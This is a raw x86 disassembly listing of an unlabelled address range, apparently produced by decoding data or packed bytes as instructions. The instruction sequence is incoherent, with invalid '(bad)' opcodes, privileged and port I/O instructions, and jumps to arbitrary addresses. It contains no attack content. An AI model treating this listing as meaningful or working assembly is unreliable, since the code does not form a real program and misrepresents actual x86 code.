  40e908:	stos   BYTE PTR es:[edi],al
  40e909:	sub    edi,esi
  40e90b:	jne    0x40e90d
	...
  40e91d:	add    BYTE PTR [eax],al
  40e91f:	add    BYTE PTR [ecx+0x29],dl
  40e922:	jge    0x40e900
  40e924:	pop    edx
  40e925:	stos   DWORD PTR es:[edi],eax
  40e926:	add    al,0xe8
  40e928:	stos   BYTE PTR es:[edi],al
  40e929:	(bad)  
  40e92a:	cmc    
  40e92b:	dec    DWORD PTR [edx-0x55]
  40e92e:	shr    al,0xa5
  40e931:	push   esp
  40e932:	cmc    
  40e933:	(bad)  
  40e934:	jp     0x40e900
  40e936:	mov    edi,0x5b9535c2
  40e93b:	mov    edi,ecx
  40e93d:	adc    al,0xca
  40e93f:	call   0x55d9cfa
  40e944:	sub    bl,BYTE PTR [ebx+ebx*1]
  40e947:	add    DWORD PTR ds:0xb1458395,esp
  40e94d:	rol    BYTE PTR [ebx-0x7c3ff2bb],0x45
  40e954:	cdq    
  40e955:	shl    BYTE PTR [edx+0x2],0xaa
  40e959:	stos   DWORD PTR es:[edi],eax
  40e95a:	sbb    al,ch
  40e95c:	test   BYTE PTR [ecx],ah
  40e95e:	idiv   edi
  40e960:	jbe    0x40e915
  40e962:	lock add DWORD PTR [edx+esi*8-0x4730d80],ecx
  40e96a:	or     edi,edi
  40e96c:	jns    0x40e935
  40e96e:	test   DWORD PTR [esp+ebx*8-0x1e],eax
  40e972:	in     al,0x64
  40e974:	dec    ebp
  40e975:	sti    
  40e976:	xchg   esi,eax
  40e977:	je     0x40e955
  40e979:	push   edx
  40e97a:	jne    0x40e9c2
  40e97c:	mov    ebx,?
  40e97e:	add    al,al
  40e980:	fwait
  40e981:	jo     0x40e937
  40e983:	inc    DWORD PTR [eax]
	...
  40e995:	add    BYTE PTR [eax],al
  40e997:	add    bl,al
  40e999:	cli    
  40e99a:	cwde   
  40e99b:	inc    esp
  40e99c:	ror    BYTE PTR [edx-0x67],0x44
  40e9a0:	mov    ah,0x2a
  40e9a2:	cdq    
  40e9a3:	inc    esp
  40e9a4:	test   al,0x2a
  40e9a6:	and    BYTE PTR [eax],al
  40e9a8:	mov    ds:0xb2e7f987,eax
  40e9ad:	add    BYTE PTR [edi-0x6b8ff002],dl
  40e9b3:	add    BYTE PTR [ebx-0x7c00ae90],bl
  40e9b9:	(bad)  
  40e9ba:	xchg   esi,eax
  40e9bb:	je     0x40e93d
  40e9bd:	push   esi
  40e9be:	nop
  40e9bf:	arpl   bp,cx
  40e9c1:	std    
  40e9c2:	mov    eax,ds:0x9fdd345
  40e9c7:	or     ecx,DWORD PTR [edi+ebp*8-0x80]
  40e9cb:	mov    ds:0x8d09fd8c,al
  40e9d0:	leave  
  40e9d1:	sub    DWORD PTR [edx],edi
  40e9d3:	(bad)  
  40e9d4:	shl    DWORD PTR ds:0x21c98d3a,1
  40e9da:	cmp    ch,BYTE PTR [edx-0x71]
  40e9dd:	push   ss
  40e9de:	adc    DWORD PTR [eax],edx
  40e9e0:	and    al,0xcd
  40e9e2:	fwait
  40e9e3:	(bad)  
  40e9e4:	sub    edi,DWORD PTR [ebx+0x28]
  40e9e7:	clc    
  40e9e8:	mov    esi,gs
  40e9ea:	add    BYTE PTR [edx-0x74f60274],0xc9
  40e9f1:	xchg   esp,eax
  40e9f2:	push   ebx
  40e9f3:	sahf   
  40e9f4:	mov    ebx,0x10afad17
  40e9f9:	push   edx
  40e9fa:	push   ebx
  40e9fb:	xor    eax,DWORD PTR [eax]
	...
  40ea0d:	add    BYTE PTR [eax],al
  40ea0f:	add    BYTE PTR [ecx],cl
  40ea11:	push   edx
  40ea12:	push   edi
  40ea13:	xor    eax,DWORD PTR [ecx]
  40ea15:	push   edx
  40ea16:	dec    ebx
  40ea17:	xor    esi,DWORD PTR [esi-0x70]
  40ea1a:	sbb    BYTE PTR ss:[esp+edi*8+0x68],bh
  40ea1f:	xchg   ebp,eax
  40ea20:	fiadd  DWORD PTR [edi]
  40ea22:	arpl   WORD PTR [eax],sp
  40ea24:	aam    0x95
  40ea26:	xchg   esp,eax
  40ea27:	rcl    DWORD PTR ds:[ecx-0x6bb3728d],cl
  40ea2e:	push   ds
  40ea2f:	sahf   
  40ea30:	mov    edx,0xec082f07
  40ea35:	push   ss
  40ea36:	mov    eax,ds:0xf707ab03
  40ea3b:	popf   
  40ea3c:	retf   0x4391
  40ea3f:	lea    ecx,[esp+edx*4-0x1a]
  40ea43:	popf   
  40ea44:	xchg   edx,eax
  40ea45:	pop    es
  40ea46:	out    dx,eax
  40ea47:	pop    ss
  40ea48:	cmp    ah,0xe1
  40ea4b:	lahf   
  40ea4c:	add    BYTE PTR [edi],0xa7
  40ea4f:	inc    edi
  40ea50:	fs xchg ebp,eax
  40ea52:	fild   WORD PTR [ebx]
  40ea54:	mov    WORD PTR [ebx],ss
  40ea56:	or     eax,0xdf551980
  40ea5b:	pushf  
  40ea5c:	fistp  QWORD PTR [ebp+0x15fbdf62]
  40ea62:	and    DWORD PTR [ebx+edx*2],eax
  40ea65:	cmp    BYTE PTR [edi+0x66308880],0x43
  40ea6c:	mov    WORD PTR [edi],es
  40ea6e:	adc    al,0xf5
  40ea70:	mov    bl,0x75
  40ea72:	pop    ecx
  40ea73:	inc    esp
	...
  40ea88:	mov    WORD PTR [ecx],ds
  40ea8a:	and    eax,0xfd07dbac
  40ea8f:	scas   eax,DWORD PTR es:[edi]
  40ea90:	and    al,BYTE PTR [ecx+0x7ff8e508]
  40ea96:	add    BYTE PTR [ecx+0x66f60c80],al
  40ea9c:	xlat   BYTE PTR ds:[ebx]
  40ea9d:	aam    0x18
  40ea9f:	jmp    0x6b26065e
  40eaa4:	(bad)  
  40eaa5:	cli    
  40eaa6:	cmc    
  40eaa7:	aam    0x87
  40eaa9:	cld    
  40eaaa:	ss pushf 
  40eaac:	or     BYTE PTR [esi],al
  40eaae:	arpl   cx,bx
  40eab0:	adc    dl,BYTE PTR [eax-0x8]
  40eab3:	cdq    
  40eab4:	clc    
  40eab5:	jg     0x40eab7
  40eab7:	inc    ecx
  40eab8:	cmp    BYTE PTR [edx-0xb],ah
  40eabb:	es xchg ebp,eax
  40eabd:	aam    0x7b
  40eabf:	in     eax,0xd6
  40eac1:	aam    0x0
  40eac3:	jmp    0x5a18f2d
  40eac8:	fs push ebp
  40eaca:	or     BYTE PTR [ebx+edx*2+0x4],dh
  40eace:	pop    ecx
  40eacf:	adc    DWORD PTR [edx+0x6b],edi
  40ead2:	cmc    
  40ead3:	test   BYTE PTR [esp+edx*8-0x2b391a85],0x0
  40eadb:	jmp    0xe9253c30
  40eae0:	(bad)  
  40eae1:	xchg   esp,eax
  40eae2:	or     BYTE PTR [edx+edx*8-0x8],ah
  40eae6:	pop    eax
  40eae7:	into   
  40eae8:	call   0x0:0xb5e09c
	...
  40eaff:	add    BYTE PTR [edx+0x4ff2f605],ah
  40eb05:	or     BYTE PTR [esi],0x6a
  40eb08:	jp     0x40eb02
  40eb0a:	or     BYTE PTR [edx+ecx*4],dh
  40eb0d:	mov    ecx,0x8e4db0c8
  40eb12:	or     BYTE PTR [ecx],bh
  40eb14:	xor    eax,0xfeece1dd
  40eb19:	in     eax,dx
  40eb1a:	jns    0x40eb04
  40eb1c:	into   
  40eb1d:	cdq    
  40eb1e:	enter  0x2800,0x21
  40eb22:	pop    esi
  40eb23:	or     DWORD PTR ds:0x5d057b93,0xffffff91
  40eb2a:	or     BYTE PTR [ecx],al
  40eb2c:	and    eax,0xe901f115
  40eb31:	(bad)  
  40eb32:	and    eax,eax
  40eb34:	mov    esp,0x6000dd3
  40eb39:	jle    0x40eabe
  40eb3b:	inc    ecx
  40eb3c:	in     eax,0x16
  40eb3e:	dec    ebp
  40eb3f:	in     al,dx
  40eb40:	add    eax,0x3d087d29
  40eb45:	pop    ebp
  40eb46:	pop    esp
  40eb47:	jmp    DWORD PTR [edx+0x1901fe14]
  40eb4d:	(bad)  
  40eb51:	sahf   
  40eb52:	push   cs
  40eb53:	and    DWORD PTR [eax],0x36
  40eb56:	div    BYTE PTR [ebx+ebp*4-0x4]
  40eb5a:	mov    ch,0xc9
  40eb5c:	addr16 cdq 
  40eb5e:	or     BYTE PTR [ebp-0xb9ca08],cl
	...
  40eb78:	sbb    BYTE PTR [ecx+0x28f892e0],bl
  40eb7e:	test   DWORD PTR [ebx+0x57c939d],0x750828f6
  40eb88:	imul   ecx,DWORD PTR [esi],0x75
  40eb8b:	in     al,dx
  40eb8c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40eb8e:	push   cs
  40eb8f:	sub    esp,DWORD PTR ds:0x7508c7d7
  40eb95:	sbb    al,0x4d
  40eb97:	in     al,dx
  40eb98:	test   DWORD PTR [ecx],ebp
  40eb9a:	jge    0x40eba4
  40eb9c:	dec    ebp
  40eb9d:	mov    al,ds:0x9522ff5b
  40eba2:	enter  0x3b75,0xe
  40eba6:	jne    0x40eb94
  40eba8:	xor    eax,0x8c2b0ea4
  40ebad:	cmp    eax,esp
  40ebaf:	rol    DWORD PTR [ebx+edi*8-0x54c7bb80],0x91
  40ebb7:	je     0x40eb4d
  40ebb9:	and    edi,DWORD PTR [ecx]
  40ebbb:	push   ebp
  40ebbc:	sbb    edi,DWORD PTR [esi-0x73]
  40ebbf:	test   esp,0x89830800
  40ebc5:	pop    edi
  40ebc6:	or     al,0x75
  40ebc8:	mov    ah,BYTE PTR [edx-0xd313734]
  40ebce:	or     DWORD PTR [ebp-0xc338b7],ecx
  40ebd4:	popa   
  40ebd5:	add    esp,DWORD PTR [edx-0x6e39c6ca]
  40ebdb:	add    BYTE PTR [eax],0x0
	...
  40ebee:	add    BYTE PTR [eax],al
  40ebf0:	aam    0x9a
  40ebf2:	pop    ss
  40ebf3:	push   es
  40ebf4:	(bad)  
  40ebf7:	inc    DWORD PTR [eax-0xb]
  40ebfa:	out    0xbf,al
  40ebfc:	aad    0xb8
  40ebfe:	add    al,0x0
  40ec00:	or     DWORD PTR [eax],edi
  40ec02:	scas   al,BYTE PTR es:[edi]
  40ec03:	dec    edi
  40ec04:	mov    bl,0x1f
  40ec06:	add    ch,al
  40ec08:	xchg   BYTE PTR [eax],ch
  40ec0a:	xchg   ebx,eax
  40ec0b:	dec    BYTE PTR [edi]
  40ec0d:	xchg   ebx,eax
  40ec0e:	in     al,dx
  40ec0f:	je     0x40eba3
  40ec11:	jp     0x40ec22
  40ec13:	in     al,dx
  40ec14:	mov    WORD PTR [eax+0x454c2b07],es
  40ec1a:	int3   
  40ec1b:	pop    es
  40ec1c:	mov    WORD PTR [eax+0x48],?
  40ec1f:	in     al,dx
  40ec20:	fcom   QWORD PTR [edi-0x14]
  40ec23:	(bad)  
  40ec24:	stc    
  40ec25:	cmc    
  40ec26:	mov    eax,ds:0x92dac125
  40ec2b:	mov    ecx,cs
  40ec2d:	sar    DWORD PTR [ecx],1
  40ec2f:	jmp    ecx
  40ec31:	cmc    
  40ec32:	mov    eax,ds:0x9332b895
  40ec37:	add    BYTE PTR [ebp+edx*4-0x20],0x15
  40ec3c:	xchg   edi,eax
  40ec3d:	pop    ss
  40ec3e:	test   al,0x6
  40ec40:	ret    
  40ec41:	call   0x21c:0x95201862
  40ec48:	ja     0x40ec1e
  40ec4a:	mov    eax,0x42948bc5
  40ec4f:	jnp    0x40ec5a
  40ec51:	push   esi
  40ec52:	fisttp WORD PTR [eax+0x0]
	...
  40ec68:	enter  0xff0,0x2e
  40ec6c:	mov    ah,0x3
  40ec6e:	aad    0xb
  40ec70:	hlt    
  40ec71:	add    eax,0x6cfa9abc
  40ec76:	adc    eax,0x5494b358
  40ec7b:	inc    eax
  40ec7c:	clc    
  40ec7d:	fld    DWORD PTR fs:[ebx+eiz*8]
  40ec81:	mov    ebx,esp
  40ec83:	call   0x3da:0x27478c60
  40ec8a:	daa    
  40ec8b:	int3   
  40ec8c:	int    0x8c
  40ec8e:	fbstp  TBYTE PTR [eax]
  40ec90:	pop    ss
  40ec91:	icebp  
  40ec92:	bound  edi,QWORD PTR [edi-0x685aee49]
  40ec98:	inc    ebx
  40ec99:	in     al,dx
  40ec9a:	pop    ss
  40ec9b:	xor    ebp,DWORD PTR [ebx-0x5feff0fd]
  40eca1:	add    edi,DWORD PTR [ebp+0x7]
  40eca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eca5:	lock xchg ecx,eax
  40eca7:	call   0x39b:0xf1f8f92
  40ecae:	push   ebp
  40ecaf:	or     al,0x83
  40ecb1:	mov    ebx,edx
  40ecb3:	lods   al,BYTE PTR ds:[esi]
  40ecb4:	mov    dh,0x2
  40ecb6:	fistp  WORD PTR [ecx+0x45cd486]
  40ecbc:	imul   ecx,DWORD PTR [ecx+0x645caccb],0xffffffb6
  40ecc3:	cdq    
  40ecc4:	inc    esp
  40ecc5:	(bad)  
  40ecc6:	or     ch,ah
  40ecc8:	(bad)
	...
  40ece0:	and    eax,0xe1910488
  40ece5:	pusha  
  40ece6:	cmc    
  40ece7:	sahf   
  40ece8:	mov    esp,edx
  40ecea:	jl     0x40ecb6
  40ecec:	adc    al,0x88
  40ecee:	sbb    BYTE PTR [ecx],bh
  40ecf0:	clc    
  40ecf1:	dec    ebx
  40ecf2:	push   ebx
  40ecf3:	xchg   BYTE PTR ds:0xb6806053,al
  40ecf9:	ret    
  40ecfa:	or     BYTE PTR [esi-0x7d],dh
  40ecfd:	pushf  
  40ecfe:	cmc    
  40ecff:	hlt    
  40ed00:	sti    
  40ed01:	push   edx
  40ed02:	cmc    
  40ed03:	fcom   QWORD PTR [edi+0x156980ec]
  40ed09:	add    ah,cl
  40ed0b:	adc    eax,0x20f603b7
  40ed10:	shl    BYTE PTR [esi-0x10ef63f8],cl
  40ed16:	pusha  
  40ed17:	jmp    0xc1f7e0ab
  40ed1c:	pop    ds
  40ed1d:	ja     0x40ed66
  40ed1f:	jmp    0x93457548
  40ed24:	rol    DWORD PTR [ecx],0x7c
  40ed27:	icebp  
  40ed28:	out    0x32,eax
  40ed2a:	not    BYTE PTR [esi]
  40ed2c:	adc    eax,0xf4e9087b
  40ed31:	inc    eax
  40ed32:	popa   
  40ed33:	and    BYTE PTR [ebp+edx*2+0x8],ch
  40ed37:	dec    BYTE PTR [edx-0xb2c9d70]
  40ed3d:	xchg   DWORD PTR [eax],eax
  40ed3f:	add    DWORD PTR [edi],eax
  40ed41:	add    esi,esi
  40ed43:	out    0x0,al
	...
  40ed55:	add    BYTE PTR [eax],al
  40ed57:	add    BYTE PTR [edi-0x2a31f76c],dh
  40ed5d:	jns    0x40ed37
  40ed5f:	dec    ebp
  40ed60:	iret   
  40ed61:	xchg   esp,eax
  40ed62:	cmc    
  40ed63:	push   esp
  40ed64:	xchg   esp,eax
  40ed65:	outs   dx,BYTE PTR ds:[esi]
  40ed66:	adc    al,0x0
  40ed68:	dec    edx
  40ed69:	xchg   ebx,eax
  40ed6a:	add    al,ch
  40ed6c:	out    0x1c,eax
  40ed6e:	idiv   edi
  40ed70:	int    0x98
  40ed72:	or     bh,ch
  40ed74:	mov    ebx,0x7464cfad
  40ed79:	cwde   
  40ed7a:	cmc    
  40ed7b:	jne    0x40eda6
  40ed7d:	mov    al,0x14
  40ed7f:	call   DWORD PTR [eax+0x1a6be090]
  40ed85:	sbb    eax,0x963568f7
  40ed8a:	in     eax,0xbe
  40ed8c:	jge    0x40edd6
  40ed8e:	push   0x41
  40ed90:	and    eax,0x8f0c7d1d
  40ed95:	div    esi
  40ed97:	jne    0x40ed96
  40ed99:	sub    eax,0x1c5aff5a
  40ed9e:	outs   dx,BYTE PTR ds:[esi]
  40ed9f:	add    ch,ah
  40eda1:	sub    al,0xb4
  40eda3:	push   0x47a19c
  40eda8:	dec    edx
  40eda9:	xchg   edx,eax
  40edaa:	add    al,0x6a
  40edac:	xchg   BYTE PTR [ebx],bl
  40edae:	jge    0x40edb8
  40edb0:	dec    ebp
  40edb1:	jmp    0x8c7:0xce7afff6
  40edb8:	mov    ch,0xb2
  40edba:	sub    esp,0x0
	...
  40edd0:	es inc ecx
  40edd2:	repnz push 0xffffffa5
  40edd5:	scas   eax,DWORD PTR es:[edi]
  40edd6:	cmp    bh,bh
  40edd8:	add    BYTE PTR [esi+0x1d00cde0],cl
  40edde:	test   DWORD PTR [ecx+0x716e29f0],0xff085700
  40ede8:	add    BYTE PTR [esi+0x296a4de0],cl
  40edee:	idiv   edi
  40edf0:	loopne 0x40ee0e
  40edf2:	div    DWORD PTR [ebp-0x74]
  40edf5:	repz mov eax,ds:0x9dd2c1f7
  40edfb:	enter  0xef4e,0x9
  40edff:	push   ebp
  40ee00:	pop    es
  40ee01:	iret   
  40ee02:	mov    ebx,eax
  40ee04:	push   eax
  40ee05:	push   ebp
  40ee06:	or     al,0x6a
  40ee08:	jg     0x40ee3c
  40ee0a:	sbb    BYTE PTR [eax],cl
  40ee0c:	xor    al,0x17
  40ee0e:	cmp    bh,bh
  40ee10:	cmp    eax,DWORD PTR [edi+eax*2+0x276ba4fc]
  40ee17:	inc    ecx
  40ee18:	mov    WORD PTR [edx],ss
  40ee1a:	sbb    BYTE PTR [eax],cl
  40ee1c:	xor    al,0xf7
  40ee1e:	sahf   
  40ee1f:	(bad)  
  40ee20:	sbb    eax,DWORD PTR [edx+0x13fc17]
  40ee26:	add    ch,al
  40ee28:	shl    DWORD PTR [edi-0x532a0163],cl
  40ee2e:	or     BYTE PTR [eax],al
  40ee30:	popa   
  40ee31:	xchg   BYTE PTR [eax+0x82],ah
	...
  40ee47:	add    al,cl
  40ee49:	bound  esp,QWORD PTR [edx]
  40ee4b:	add    BYTE PTR [esi-0x59],dh
  40ee4e:	popf   
  40ee4f:	je     0x40ede5
  40ee51:	arpl   WORD PTR [ecx],sp
  40ee53:	push   ebp
  40ee54:	fcmovnb st,st(1)
  40ee56:	add    DWORD PTR [eax+edx*8-0x2e],0x7f
  40ee5b:	fs dec ebp
  40ee5d:	jmp    0x40edfd
  40ee5f:	je     0x40edf5
  40ee61:	mov    ds:0xa1bbfda1,eax
  40ee66:	and    al,BYTE PTR [eax]
  40ee68:	and    al,0x55
  40ee6a:	daa    
  40ee6b:	inc    ecx
  40ee6c:	mov    WORD PTR [ebx],ss
  40ee6e:	fs fs dec ebp
  40ee71:	jmp    0x40ee11
  40ee73:	xor    al,0xb4
  40ee75:	inc    edx
  40ee76:	dec    ebp
  40ee77:	add    BYTE PTR [esi+ecx*8-0xc7400ce],ah
  40ee7e:	leave  
  40ee7f:	jae    0x40ee44
  40ee81:	xchg   esp,eax
  40ee82:	js     0x40eec4
  40ee84:	je     0x40eef3
  40ee86:	call   0x47d5a1e0
  40ee8b:	add    al,0x8c
  40ee8d:	out    dx,eax
  40ee8e:	test   DWORD PTR [ebx],ebp
  40ee90:	cmp    al,0x79
  40ee92:	and    BYTE PTR [ebx+ebx*2],al
  40ee95:	mov    al,bh
  40ee97:	xchg   esi,eax
  40ee98:	fmul   DWORD PTR [edi+eax*8-0x5900352f]
  40ee9f:	sub    eax,DWORD PTR [ebp+0x3f]
  40eea2:	and    BYTE PTR [esp+eiz*4],al
  40eea5:	xchg   esp,eax
  40eea6:	fbld   TBYTE PTR [esi+0x1fb86cf1]
	...
  40eec0:	int    0x94
  40eec2:	xchg   BYTE PTR [eax],dl
  40eec4:	and    al,0x0
  40eec6:	cmc    
  40eec7:	or     esp,DWORD PTR [ebx*4+0x1296f6]
  40eece:	cmc    
  40eecf:	fwait
  40eed0:	repz int 0x1e
  40eed3:	xchg   edi,eax
  40eed4:	add    al,BYTE PTR [eax]
  40eed6:	aad    0x97
  40eed8:	cli    
  40eed9:	mov    edi,esi
  40eedb:	stos   DWORD PTR es:[edi],eax
  40eedc:	mov    bh,0x69
  40eede:	pop    esi
  40eedf:	xchg   esi,eax
  40eee0:	aam    0xd2
  40eee2:	jmp    0x40eee7
  40eee4:	cmp    DWORD PTR [ebx],ecx
  40eee6:	pop    esp
  40eee7:	or     bh,0x0
  40eeea:	fiadd  DWORD PTR [ebx]
  40eeec:	leavew 
  40eeee:	adc    BYTE PTR ds:[esp+ebp*8-0x3cd0c1],dl
  40eef6:	js     0x40ef38
  40eef8:	mov    eax,0x4d205d6c
  40eefd:	xchg   esp,eax
  40eefe:	push   ds
  40eeff:	adc    BYTE PTR [esp+ebp*8-0x5d6a81],dl
  40ef06:	push   cs
  40ef07:	adc    BYTE PTR [eax-0x5bf48301],bl
  40ef0d:	mov    ecx,DWORD PTR [eax]
  40ef0f:	pushf  
  40ef10:	and    bh,dh
  40ef12:	mov    edi,0x5cff832b
  40ef17:	jb     0x40ef3d
  40ef19:	adc    cl,ch
  40ef1b:	frstor [esi+0x11f6294]
  40ef21:	mov    BYTE PTR [eax],al
  40ef23:	rol    DWORD PTR [eax],0x0
	...
  40ef36:	add    BYTE PTR [eax],al
  40ef38:	jmp    0x807e4a0
  40ef3d:	pop    eax
  40ef3e:	hlt    
  40ef3f:	push   ecx
  40ef40:	mov    ecx,0x20e94778
  40ef45:	mov    BYTE PTR [eax],al
  40ef47:	shr    DWORD PTR [ecx],0x1
  40ef4a:	mul    BYTE PTR [esi-0x610b77df]
  40ef50:	or     DWORD PTR [eax+eiz*8-0xa00a34d],0xffffffa0
  40ef58:	dec    esi
  40ef59:	xchg   ebx,eax
  40ef5a:	or     BYTE PTR [eax*1-0xb5a7615],bl
  40ef61:	ins    BYTE PTR es:[edi],dx
  40ef62:	or     BYTE PTR [ebx],al
  40ef64:	fscale 
  40ef66:	jnp    0x40ef49
  40ef68:	aaa    
  40ef69:	sbb    DWORD PTR [esi+eiz*2+0x21],0xa05d4c0c
  40ef71:	int    0x6b
  40ef73:	test   al,0x8f
  40ef75:	(bad)  
  40ef76:	jnp    0x40ef59
  40ef78:	aaa    
  40ef79:	add    esp,esi
  40ef7b:	inc    esi
  40ef7c:	add    esi,edi
  40ef7e:	jnp    0x40efbd
  40ef80:	stc    
  40ef81:	xchg   DWORD PTR [eax],eax
  40ef83:	inc    ecx
  40ef84:	aaa    
  40ef85:	arpl   bp,si
  40ef87:	xlat   BYTE PTR cs:[ebx]
  40ef89:	aam    0xc
  40ef8b:	jmp    0x6b25fafa
  40ef90:	int3   
  40ef91:	cli    
  40ef92:	(bad)  
  40ef93:	jmp    0x9536ac0d
  40ef98:	xchg   edi,eax
  40ef99:	in     al,dx
  40ef9a:	inc    ebx
	...
  40efaf:	add    cl,bh
  40efb1:	daa    
  40efb2:	test   DWORD PTR [ecx-0x2e91d918],0xff085318
  40efbc:	clc    
  40efbd:	mov    eax,esp
  40efbf:	int    0x70
  40efc1:	sub    edi,esi
  40efc3:	(bad)  
  40efc4:	fcomp  DWORD PTR [edi+esi*8]
  40efc7:	jne    0x40f036
  40efc9:	sub    bh,BYTE PTR [esi+0x54]
  40efcc:	push   edx
  40efcd:	sub    ecx,eax
  40efcf:	ret    0x9269
  40efd2:	pop    ebx
  40efd3:	mov    eax,DWORD PTR [ecx+0x29]
  40efd6:	jge    0x40efe4
  40efd8:	dec    ebp
  40efd9:	push   ebp
  40efda:	push   ecx
  40efdb:	push   edx
  40efdd:	mov    eax,cs
  40efdf:	je     0x40ef71
  40efe1:	mov    al,0xec
  40efe3:	gs fs cwde 
  40efe6:	pop    eax
  40efe7:	call   0x36abde
  40efec:	gs daa 
  40efee:	jge    0x40f000
  40eff0:	jne    0x40f019
  40eff2:	jge    0x40effc
  40eff4:	std    
  40eff5:	jmp    0x40efd5
  40eff7:	inc    DWORD PTR [edx+0x7256c029]
  40effd:	sub    cl,al
  40efff:	ret    0x9201
  40f002:	pop    ebx
  40f003:	mov    eax,DWORD PTR [ecx+0x14]
  40f006:	retf   0x2af8
  40f009:	lods   al,BYTE PTR ds:[esi]
  40f00a:	or     BYTE PTR [edx+0x7c],ch
  40f00d:	daa    
  40f00e:	jge    0x40f018
  40f010:	cmp    eax,0xff5b2c
	...
  40f025:	add    BYTE PTR [eax],al
  40f027:	add    BYTE PTR [edx+0x2efc4d0a],dl
  40f02d:	out    0x51,al
  40f02f:	dec    eax
  40f030:	hlt    
  40f031:	xchg   ecx,eax
  40f032:	mov    BYTE PTR [edi],bh
  40f034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f035:	lea    esi,[eax+ebp*2+0x4e]
  40f039:	sahf   
  40f03a:	inc    edi
  40f03b:	add    BYTE PTR [esi+edi*1-0x14b0f25e],cl
  40f042:	or     DWORD PTR [ebx],ecx
  40f044:	int3   
  40f045:	jg     0x40f083
  40f047:	push   edi
  40f048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f049:	or     DWORD PTR [edx],ebp
  40f04b:	dec    DWORD PTR [ebx-0x268c360e]
  40f051:	je     0x40f089
  40f053:	clc    
  40f054:	jnp    0x40f0b6
  40f056:	test   BYTE PTR [ecx-0x6a],ch
  40f059:	fimul  WORD PTR [edi]
  40f05b:	or     BYTE PTR [ebp+ebp*2-0x67],dh
  40f05f:	(bad)  
  40f060:	arpl   si,cx
  40f062:	psubb  mm4,mm6
  40f065:	neg    DWORD PTR [edx+0x3e38474]
  40f06b:	dec    DWORD PTR [ebx+0x46]
  40f06e:	call   0xc1fe:0xed514474
  40f075:	add    edx,DWORD PTR [edx-0x65e1cc95]
  40f07b:	cmp    dl,BYTE PTR [bx+si+0x4b]
  40f080:	and    ebp,DWORD PTR [eax-0x4bdf187c]
  40f086:	cdq    
  40f087:	inc    BYTE PTR [edi+0x12112b]
	...
  40f09d:	add    BYTE PTR [eax],al
  40f09f:	add    BYTE PTR [esi+eax*4+0xf],bl
  40f0a3:	clc    
  40f0a4:	pop    esp
  40f0a5:	outs   dx,BYTE PTR ds:[esi]
  40f0a6:	invd   
  40f0a8:	in     al,0x15
  40f0aa:	mov    bl,0xfe
  40f0ac:	repz (bad) 
  40f0ae:	fst    DWORD PTR [ebp-0x15]
  40f0b1:	gs cdq 
  40f0b3:	je     0x40f099
  40f0b5:	push   edx
  40f0b6:	rcl    DWORD PTR [ebp-0x25],1
  40f0b9:	push   ebp
  40f0ba:	cwde   
  40f0bb:	xor    cl,ah
  40f0bd:	adc    ebx,DWORD PTR [edx-0x613a3402]
  40f0c3:	lods   eax,DWORD PTR ds:[esi]
  40f0c4:	test   dh,dh
  40f0c6:	adc    BYTE PTR [ebx+edi*4-0x4d706b6d],al
  40f0cd:	xchg   bh,dh
  40f0cf:	fwait
  40f0d0:	pop    es
  40f0d1:	popa   
  40f0d2:	push   ds
  40f0d3:	xchg   ebx,eax
  40f0d4:	inc    edx
  40f0d5:	retf   
  40f0d6:	and    DWORD PTR [eax],ecx
  40f0d8:	mov    WORD PTR [edi+0x7a],fs
  40f0db:	mov    al,ds:0x9be38692
  40f0e0:	icebp  
  40f0e1:	pop    esi
  40f0e2:	(bad)  
  40f0e3:	xchg   edx,eax
  40f0e4:	xchg   esi,eax
  40f0e5:	aam    0x7b
  40f0e7:	lock repz stc 
  40f0ea:	inc    esp
  40f0eb:	inc    ebp
  40f0ec:	mov    WORD PTR [edi+edx*8-0x6b],fs
  40f0f0:	(bad)  
  40f0f1:	sti    
  40f0f2:	fidiv  WORD PTR [ebx]
  40f0f4:	arpl   WORD PTR [edx-0x7da4cc11],ax
  40f0fa:	neg    DWORD PTR [ebx-0x6d491d40]
  40f100:	xor    ebp,edx
  40f102:	adc    al,0x93
	...
  40f118:	inc    edx
  40f119:	into   
  40f11a:	mov    eax,ds:0x7a613bff
  40f11f:	lahf   
  40f120:	push   cs
  40f121:	shl    DWORD PTR [edi+0x994b63a],1
  40f127:	into   
  40f128:	and    al,BYTE PTR [edx+0x67899be7]
  40f12e:	mov    ss,WORD PTR [edx+0x7e735204]
  40f134:	enter  0x2758,0x45
  40f138:	mov    WORD PTR [edi+eiz*4],ss
  40f13b:	add    eax,DWORD PTR [eax+0x688bd75d]
  40f141:	push   ebp
  40f142:	fistp  QWORD PTR [edx]
  40f144:	hlt    
  40f145:	lds    esp,FWORD PTR [ecx+0x1f8f8c03]
  40f14b:	pop    ss
  40f14c:	cwde   
  40f14d:	arpl   WORD PTR [edi-0x78],dx
  40f150:	xor    bh,bl
  40f152:	dec    BYTE PTR ss:[ebx]
  40f155:	or     DWORD PTR [eax],0xf05040fb
  40f15b:	cs xchg esp,eax
  40f15d:	cld    
  40f15e:	bound  eax,QWORD PTR [ebx]
  40f160:	pop    ds
  40f161:	add    DWORD PTR [eax],0xf5fb1511
  40f167:	push   ss
  40f168:	inc    BYTE PTR [eax-0x5547c10]
  40f16e:	jnp    0x40f161
  40f170:	idiv   DWORD PTR [ebp+esi*8-0x2]
  40f174:	sbb    eax,0xa0f17bfa
  40f179:	mov    bh,0xf5
  40f17b:	je     0x40f17d
	...
  40f18d:	add    BYTE PTR [eax],al
  40f18f:	add    BYTE PTR [edi-0xd],dh
  40f192:	fs out 0x1d,al
  40f195:	cli    
  40f196:	cmc    
  40f197:	push   esp
  40f198:	sbb    bl,dh
  40f19a:	jae    0x40f1d8
  40f19c:	std    
  40f19d:	stc    
  40f19e:	hlt    
  40f19f:	sbb    dl,BYTE PTR [eax+0x3c]
  40f1a2:	test   dh,0xfd
  40f1a5:	stc    
  40f1a6:	cli    
  40f1a7:	(bad)  
  40f1a8:	pop    eax
  40f1a9:	xchg   edx,eax
  40f1aa:	jnp    0x40f13a
  40f1ac:	sbb    eax,0xa3aef480
  40f1b1:	mov    eax,fs
  40f1b3:	mov    edi,DWORD PTR [edx-0x5]
  40f1b6:	cmc    
  40f1b7:	ds out 0xd4,eax
  40f1ba:	or     al,0xe9
  40f1bc:	pop    edx
  40f1bd:	pmulhw mm5,QWORD PTR [edx+0x44]
  40f1c1:	call   FWORD PTR [ebp+0x13]
  40f1c4:	mov    BYTE PTR [esi+0x31],ch
